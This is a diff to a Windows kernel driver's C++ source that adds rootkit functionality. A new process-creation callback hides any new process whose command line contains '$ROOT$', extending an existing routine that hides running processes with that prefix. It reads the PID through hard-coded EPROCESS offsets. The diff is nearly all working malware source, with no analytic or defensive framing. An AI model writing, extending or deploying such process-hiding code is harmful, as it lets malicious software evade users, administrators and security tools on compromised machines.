@@ -4,10 +4,11 @@
 
 
 
-
+void sCreateProcessNotifyRoutineEx(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo);
 
 void SampleUnload(_In_ PDRIVER_OBJECT DriverObject) {
 	UNREFERENCED_PARAMETER(DriverObject);
+	PsSetCreateProcessNotifyRoutineEx(sCreateProcessNotifyRoutineEx, TRUE);
 	DbgPrint("Sample driver Unload called\n");
 }
 
@@ -105,7 +106,7 @@ int getPIDByName(wchar_t* name) {
 	return UniqueProcessId;
 }
 
-//Hiding all the processes that their name is starts with $ROOT$
+//Hiding all the running processes that their name is starts with $ROOT$
 NTSTATUS HideProcesses() {
 	PEPROCESS EP;
 	if (::PsLookupProcessByProcessId(::PsGetCurrentProcessId(), &EP) == STATUS_INVALID_PARAMETER) {
@@ -163,6 +164,28 @@ NTSTATUS HideProcesses() {
 
 
 
+//Hiding every new process that his name starts with $ROOT$
+void sCreateProcessNotifyRoutineEx(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo)
+{
+	UNREFERENCED_PARAMETER(pid);
+	
+	if (createInfo != NULL)
+	{
+		//Checking if the process name is starting with $ROOT$
+		if (wcsstr(createInfo->CommandLine->Buffer, L"$ROOT$") != NULL)
+		{
+			LPBYTE pUpi = ((LPBYTE)process) - 0x448 + 0x440;
+			int UniqueProcessId = *((int*)pUpi);
+			//Hiding the process
+			if (!NT_SUCCESS(HideProcess(UniqueProcessId)))
+				DbgPrint("Can't hide the process with pid: %d" , UniqueProcessId);
+		}
+	}
+}
+
+
+
+
 extern "C"
 NTSTATUS
 DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
@@ -172,6 +195,7 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 
 
 	HideProcesses();
+	PsSetCreateProcessNotifyRoutineEx(sCreateProcessNotifyRoutineEx, FALSE);
 	DbgPrint("Finish");
 
 	return STATUS_SUCCESS;
